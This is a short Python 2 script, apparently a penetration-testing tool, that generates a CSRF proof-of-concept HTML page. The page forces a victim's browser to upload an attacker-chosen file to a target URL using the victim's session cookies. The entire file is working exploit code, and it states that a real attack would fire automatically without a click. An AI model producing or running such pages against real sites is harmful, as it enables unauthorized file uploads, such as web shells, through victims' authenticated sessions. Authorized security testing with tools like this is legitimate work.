import magic, sys, os
hexFile = ""
if len(sys.argv) != 3:
  print "Usage: python csrFile.py <URL> <filePath>"
  exit()


URL = sys.argv[1]
filePath = sys.argv[2]
fileName = os.path.basename(filePath)
m=magic.open(magic.MAGIC_MIME)
m.load()
print "Content-Type: " + m.file(fileName)
with open(filePath,'rb') as f:
    b = f.read(1)
    while b:
        hexFile = hexFile+"\\x"+b.encode('hex')
        b=f.read(1)

html = """
<html>
<title>CSRF</title>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
     function submitRequest()
      {{
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "{}", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundarykyJkw6rwdQAbTRUr");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundarykyJkw6rwdQAbTRUr\\r\\n" + 
          "Content-Disposition: form-data; name=\\"file\\"; filename=\\"{}\\"\\r\\n" + 
          "Content-Type: {}\\r\\n" + 
          "\\r\\n" + 
          "{}" + 
          "------WebKitFormBoundarykyJkw6rwdQAbTRUr--\\r\\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
        alert("exploited")
      }}
     </script>
    <h2>click here to exploit (on real attack it will be perfomed automatically without clicking a button)</h2>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>""".format(URL, fileName, m.file(fileName), hexFile)

f = open("csrFile.htm" , "w")
f.write(html)
f.close()
print "Saved as csrFile.htm"
